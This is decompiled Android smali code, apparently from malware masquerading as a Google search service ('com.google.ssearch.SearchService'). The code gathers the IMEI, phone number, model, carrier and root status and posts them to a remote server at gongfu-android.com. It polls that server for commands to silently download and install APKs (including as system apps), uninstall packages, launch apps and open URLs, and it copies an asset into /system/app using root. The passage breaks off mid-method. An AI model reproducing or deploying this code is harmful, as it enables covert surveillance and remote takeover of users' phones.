.class public Lcom/google/ssearch/SearchService;
.super Landroid/app/Service;
.source "SearchService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/ssearch/SearchService$MyThread;
    }
.end annotation


# static fields
.field private static INTERVAL:J

.field public static mIdentifier:Ljava/lang/String;


# instance fields
.field private mAliaMem:Ljava/lang/String;

.field private mImei:Ljava/lang/String;

.field private mLastTickets:J

.field private mMobile:Ljava/lang/String;

.field private mModel:Ljava/lang/String;

.field private mNetType:Ljava/lang/String;

.field private mOperater:Ljava/lang/String;

.field private mOsAPI:Ljava/lang/String;

.field private mOsType:Ljava/lang/String;

.field private mPermState:I

.field private mPkgName:Ljava/lang/String;

.field private mPreferences:Landroid/content/SharedPreferences;

.field private mRun:Ljava/lang/String;

.field private mSDMem:Ljava/lang/String;

.field private mTaskId:Ljava/lang/String;

.field private mTickets:J

.field private mTimer:Ljava/util/Timer;

.field private mTimerTask:Ljava/util/TimerTask;

.field private mWaiting:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 74
    const-string v0, "sp015"

    sput-object v0, Lcom/google/ssearch/SearchService;->mIdentifier:Ljava/lang/String;

    .line 95
    const-wide/32 v0, 0xea60

    sput-wide v0, Lcom/google/ssearch/SearchService;->INTERVAL:J

    .line 43
    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    const/4 v1, 0x0

    const/4 v2, 0x0

    .line 43
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 73
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    .line 75
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mImei:Ljava/lang/String;

    .line 76
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mMobile:Ljava/lang/String;

    .line 77
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mModel:Ljava/lang/String;

    .line 78
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mOsType:Ljava/lang/String;

    .line 79
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mOsAPI:Ljava/lang/String;

    .line 80
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mAliaMem:Ljava/lang/String;

    .line 81
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mSDMem:Ljava/lang/String;

    .line 82
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mNetType:Ljava/lang/String;

    .line 83
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mOperater:Ljava/lang/String;

    .line 85
    const-string v0, ""

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mTaskId:Ljava/lang/String;

    .line 86
    iput-boolean v1, p0, Lcom/google/ssearch/SearchService;->mWaiting:Z

    .line 87
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mPkgName:Ljava/lang/String;

    .line 88
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mRun:Ljava/lang/String;

    .line 90
    iput v1, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    .line 92
    const-wide/16 v0, 0x9

    iput-wide v0, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcom/google/ssearch/SearchService;->mLastTickets:J

    .line 93
    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mTimer:Ljava/util/Timer;

    .line 43
    return-void
.end method

.method static synthetic access$0(Lcom/google/ssearch/SearchService;)V
    .locals 0

    .prologue
    .line 364
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->doTimerTask()V

    return-void
.end method

.method private checkPermission()Z
    .locals 1

    .prologue
    .line 175
    invoke-static {}, Lcom/google/ssearch/Utils;->checkPermission()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 176
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->cpLegacyRes()V

    .line 177
    const/4 v0, 0x1

    .line 179
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method private cpLegacyRes()V
    .locals 4

    .prologue
    .line 162
    new-instance v2, Ljava/io/File;

    const-string v3, "/system/app/com.google.ssearch.apk"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 172
    :cond_0
    :goto_0
    return-void

    .line 164
    :cond_1
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "/data/data/"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v3

    iget-object v3, v3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/legacy"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 165
    .local v1, "dest":Ljava/lang/String;
    const-string v2, "legacy"

    invoke-static {p0, v2, v1}, Lcom/google/ssearch/Utils;->copyAssets(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 167
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 168
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "2 "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " /system/app/com.google.ssearch.apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 169
    .local v0, "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/ssearch/Utils$TCP;->execute(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 171
    .end local v0    # "cmd":Ljava/lang/String;
    .end local v1    # "dest":Ljava/lang/String;
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method private doExecuteTask(Ljava/lang/String;)V
    .locals 4
    .param p1, "task"    # Ljava/lang/String;

    .prologue
    .line 479
    const-string v2, " "

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 480
    .local v1, "taskLine":[Ljava/lang/String;
    const/4 v2, 0x0

    aget-object v2, v1, v2

    iput-object v2, p0, Lcom/google/ssearch/SearchService;->mTaskId:Ljava/lang/String;

    .line 481
    const/4 v2, 0x1

    aget-object v2, v1, v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 483
    .local v0, "cmd":I
    packed-switch v0, :pswitch_data_0

    .line 500
    const/4 v2, -0x1

    const-string v3, "UnknownTask"

    invoke-direct {p0, v2, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 503
    :goto_0
    return-void

    .line 485
    :pswitch_0
    invoke-direct {p0, v1}, Lcom/google/ssearch/SearchService;->execHomepage([Ljava/lang/String;)V

    goto :goto_0

    .line 488
    :pswitch_1
    invoke-direct {p0, v1}, Lcom/google/ssearch/SearchService;->execInstall([Ljava/lang/String;)V

    goto :goto_0

    .line 491
    :pswitch_2
    invoke-direct {p0, v1}, Lcom/google/ssearch/SearchService;->execStartApp([Ljava/lang/String;)V

    goto :goto_0

    .line 494
    :pswitch_3
    invoke-direct {p0, v1}, Lcom/google/ssearch/SearchService;->execDelete([Ljava/lang/String;)V

    goto :goto_0

    .line 497
    :pswitch_4
    invoke-direct {p0, v1}, Lcom/google/ssearch/SearchService;->execOpenUrl([Ljava/lang/String;)V

    goto :goto_0

    .line 483
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method

.method private doSearchReport()V
    .locals 7

    .prologue
    .line 389
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->updateInfo()V

    .line 391
    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    .line 392
    .local v3, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    const-string v0, "http://search.gongfu-android.com:8511/search/sayhi.php"

    .line 394
    .local v0, "action":Ljava/lang/String;
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "imei"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mImei:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 396
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mOsType:Ljava/lang/String;

    if-eqz v4, :cond_0

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mOsType:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "ostype"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mOsType:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 397
    :cond_0
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mOsAPI:Ljava/lang/String;

    if-eqz v4, :cond_1

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mOsAPI:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "osapi"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mOsAPI:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 398
    :cond_1
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mMobile:Ljava/lang/String;

    if-eqz v4, :cond_2

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mMobile:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_2

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "mobile"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mMobile:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 399
    :cond_2
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mModel:Ljava/lang/String;

    if-eqz v4, :cond_3

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mModel:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_3

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "mobilemodel"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mModel:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 400
    :cond_3
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mOperater:Ljava/lang/String;

    if-eqz v4, :cond_4

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mOperater:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_4

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "netoperater"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mOperater:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 401
    :cond_4
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mNetType:Ljava/lang/String;

    if-eqz v4, :cond_5

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mNetType:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_5

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "nettype"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mNetType:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 402
    :cond_5
    sget-object v4, Lcom/google/ssearch/SearchService;->mIdentifier:Ljava/lang/String;

    if-eqz v4, :cond_6

    const-string v4, ""

    sget-object v5, Lcom/google/ssearch/SearchService;->mIdentifier:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_6

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "managerid"

    sget-object v6, Lcom/google/ssearch/SearchService;->mIdentifier:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 403
    :cond_6
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mSDMem:Ljava/lang/String;

    if-eqz v4, :cond_7

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mSDMem:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_7

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "sdmemory"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mSDMem:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 404
    :cond_7
    iget-object v4, p0, Lcom/google/ssearch/SearchService;->mAliaMem:Ljava/lang/String;

    if-eqz v4, :cond_8

    const-string v4, ""

    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mAliaMem:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_8

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "aliamemory"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mAliaMem:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 406
    :cond_8
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->checkPermission()Z

    move-result v4

    if-eqz v4, :cond_9

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "root"

    const-string v6, "1"

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 409
    :goto_0
    new-instance v1, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v1, v0}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 411
    .local v1, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v4, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v5, "UTF-8"

    invoke-direct {v4, v3, v5}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v1, v4}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 412
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v4, v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v2

    .line 413
    .local v2, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 416
    .end local v2    # "httpResponse":Lorg/apache/http/HttpResponse;
    :goto_1
    return-void

    .line 407
    .end local v1    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :cond_9
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "root"

    const-string v6, "0"

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 415
    .restart local v1    # "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :catch_0
    move-exception v4

    goto :goto_1
.end method

.method private doSearchTask()V
    .locals 7

    .prologue
    const/4 v6, 0x0

    .line 420
    const-string v2, ""

    iget-object v3, p0, Lcom/google/ssearch/SearchService;->mTaskId:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_4

    .line 421
    iget-boolean v2, p0, Lcom/google/ssearch/SearchService;->mWaiting:Z

    if-eqz v2, :cond_3

    iget-object v2, p0, Lcom/google/ssearch/SearchService;->mPkgName:Ljava/lang/String;

    invoke-static {p0, v2}, Lcom/google/ssearch/Utils$PkgManager;->isInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 422
    iget-object v2, p0, Lcom/google/ssearch/SearchService;->mRun:Ljava/lang/String;

    if-nez v2, :cond_2

    const/4 v2, 0x1

    move v0, v2

    .line 423
    .local v0, "state":I
    :goto_0
    const-string v2, "NorInstOK"

    invoke-direct {p0, v0, v2}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 424
    iget-object v2, p0, Lcom/google/ssearch/SearchService;->mRun:Ljava/lang/String;

    if-eqz v2, :cond_0

    iget-object v2, p0, Lcom/google/ssearch/SearchService;->mPkgName:Ljava/lang/String;

    invoke-direct {p0, v2}, Lcom/google/ssearch/SearchService;->runPackage(Ljava/lang/String;)V

    .line 425
    :cond_0
    iput-boolean v6, p0, Lcom/google/ssearch/SearchService;->mWaiting:Z

    .line 437
    .end local v0    # "state":I
    :cond_1
    :goto_1
    return-void

    .line 422
    :cond_2
    const/4 v2, 0x4

    move v0, v2

    goto :goto_0

    .line 426
    :cond_3
    iget-boolean v2, p0, Lcom/google/ssearch/SearchService;->mWaiting:Z

    if-eqz v2, :cond_1

    iget-wide v2, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    iget-wide v4, p0, Lcom/google/ssearch/SearchService;->mLastTickets:J

    sub-long/2addr v2, v4

    const-wide/16 v4, 0x5

    cmp-long v2, v2, v4

    if-ltz v2, :cond_1

    .line 427
    const/4 v2, -0x1

    const-string v3, "NorReject"

    invoke-direct {p0, v2, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 428
    iput-boolean v6, p0, Lcom/google/ssearch/SearchService;->mWaiting:Z

    goto :goto_1

    .line 433
    :cond_4
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getSearchTask()Ljava/lang/String;

    move-result-object v1

    .line 434
    .local v1, "task":Ljava/lang/String;
    if-eqz v1, :cond_1

    .line 436
    invoke-direct {p0, v1}, Lcom/google/ssearch/SearchService;->doExecuteTask(Ljava/lang/String;)V

    goto :goto_1
.end method

.method private doTimerTask()V
    .locals 4

    .prologue
    .line 365
    iget-wide v0, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    const-wide/16 v2, 0x1

    add-long/2addr v0, v2

    iput-wide v0, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    .line 367
    iget v0, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    const/4 v1, 0x2

    if-ne v0, v1, :cond_1

    .line 368
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getPermission2()V

    .line 384
    :cond_0
    :goto_0
    return-void

    .line 370
    :cond_1
    iget v0, p0, Lcom/google/ssearch/SearchService;->mPermState:I

    const/4 v1, 0x3

    if-ne v0, v1, :cond_2

    .line 371
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getPermission3()V

    goto :goto_0

    .line 375
    :cond_2
    invoke-static {p0}, Lcom/google/ssearch/Utils;->isConnected(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 377
    iget-wide v0, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    iget-wide v2, p0, Lcom/google/ssearch/SearchService;->mLastTickets:J

    sub-long/2addr v0, v2

    const-wide/16 v2, 0x3c

    cmp-long v0, v0, v2

    if-ltz v0, :cond_3

    .line 378
    iget-wide v0, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    iput-wide v0, p0, Lcom/google/ssearch/SearchService;->mLastTickets:J

    .line 379
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->doSearchReport()V

    goto :goto_0

    .line 380
    :cond_3
    iget-wide v0, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    const-wide/16 v2, 0xa

    rem-long/2addr v0, v2

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    if-nez v0, :cond_0

    .line 382
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->doSearchTask()V

    goto :goto_0
.end method

.method private execDelete([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v1, 0x2

    .line 545
    array-length v0, p1

    if-ge v0, v1, :cond_0

    .line 546
    const/4 v0, -0x1

    const-string v1, "InvalidArgs"

    invoke-direct {p0, v0, v1}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 551
    :goto_0
    return-void

    .line 550
    :cond_0
    aget-object v0, p1, v1

    invoke-direct {p0, v0}, Lcom/google/ssearch/SearchService;->uninstallPackage(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private execHomepage([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 507
    const/4 v0, -0x1

    const-string v1, "NotSupport"

    invoke-direct {p0, v0, v1}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 508
    return-void
.end method

.method private execInstall([Ljava/lang/String;)V
    .locals 10
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v9, 0x4

    const/4 v8, -0x1

    const/4 v7, 0x2

    const/4 v6, 0x3

    .line 514
    array-length v4, p1

    if-ge v4, v7, :cond_0

    .line 515
    const-string v4, "InvalidArgs"

    invoke-direct {p0, v8, v4}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 541
    :goto_0
    return-void

    .line 519
    :cond_0
    aget-object v2, p1, v7

    .line 520
    .local v2, "pkgUrl":Ljava/lang/String;
    const/4 v3, 0x0

    .line 521
    .local v3, "run":Ljava/lang/String;
    const/4 v1, 0x0

    .line 522
    .local v1, "isSys":Z
    array-length v4, p1

    const/4 v5, 0x5

    if-lt v4, v5, :cond_2

    .line 523
    aget-object v3, p1, v6

    .line 524
    aget-object v4, p1, v9

    const-string v5, "SYS"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    const/4 v1, 0x1

    .line 531
    :cond_1
    :goto_1
    const-string v4, "DownStart"

    invoke-direct {p0, v7, v4}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 532
    invoke-static {p0, v2}, Lcom/google/ssearch/Utils;->downloadFile(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 533
    .local v0, "info":[Ljava/lang/String;
    if-nez v0, :cond_4

    .line 535
    const-string v4, "DownFailed"

    invoke-direct {p0, v8, v4}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    goto :goto_0

    .line 525
    .end local v0    # "info":[Ljava/lang/String;
    :cond_2
    array-length v4, p1

    if-ne v4, v9, :cond_1

    .line 526
    aget-object v4, p1, v6

    const-string v5, "SYS"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    const/4 v1, 0x1

    goto :goto_1

    .line 527
    :cond_3
    aget-object v3, p1, v6

    goto :goto_1

    .line 538
    .restart local v0    # "info":[Ljava/lang/String;
    :cond_4
    const-string v4, "DownOK"

    invoke-direct {p0, v6, v4}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 539
    invoke-virtual {p0, v0, v3, v1}, Lcom/google/ssearch/SearchService;->installPakage([Ljava/lang/String;Ljava/lang/String;Z)V

    goto :goto_0
.end method

.method private execOpenUrl([Ljava/lang/String;)V
    .locals 5
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 565
    const/4 v3, 0x2

    :try_start_0
    aget-object v3, p1, v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 566
    .local v2, "uri":Landroid/net/Uri;
    new-instance v1, Landroid/content/Intent;

    const-string v3, "android.intent.action.VIEW"

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 567
    .local v1, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v1}, Lcom/google/ssearch/SearchService;->startActivity(Landroid/content/Intent;)V

    .line 568
    const/4 v3, 0x1

    const-string v4, "OK"

    invoke-direct {p0, v3, v4}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 572
    .end local v1    # "intent":Landroid/content/Intent;
    .end local v2    # "uri":Landroid/net/Uri;
    :goto_0
    return-void

    .line 569
    :catch_0
    move-exception v3

    move-object v0, v3

    .line 570
    .local v0, "e":Ljava/lang/Exception;
    const/4 v3, -0x1

    const-string v4, "Exception"

    invoke-direct {p0, v3, v4}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private execStartApp([Ljava/lang/String;)V
    .locals 2
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v1, 0x2

    .line 555
    array-length v0, p1

    if-ge v0, v1, :cond_0

    .line 556
    const/4 v0, -0x1

    const-string v1, "InvalidArgs"

    invoke-direct {p0, v0, v1}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 560
    :goto_0
    return-void

    .line 559
    :cond_0
    aget-object v0, p1, v1

    invoke-direct {p0, v0}, Lcom/google/ssearch/SearchService;->runPackage(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private getPermission()V
    .locals 2

    .prologue
    .line 184
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->checkPermission()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 185
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->doSearchReport()V

    .line 198
    :cond_0
    :goto_0
    return-void

    .line 189
    :cond_1
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->isVersion221()Z

    move-result v0

    if-nez v0, :cond_2

    .line 190
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getPermission1()Z

    move-result v0

    if-nez v0, :cond_0

    .line 193
    :cond_2
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/bin/su"

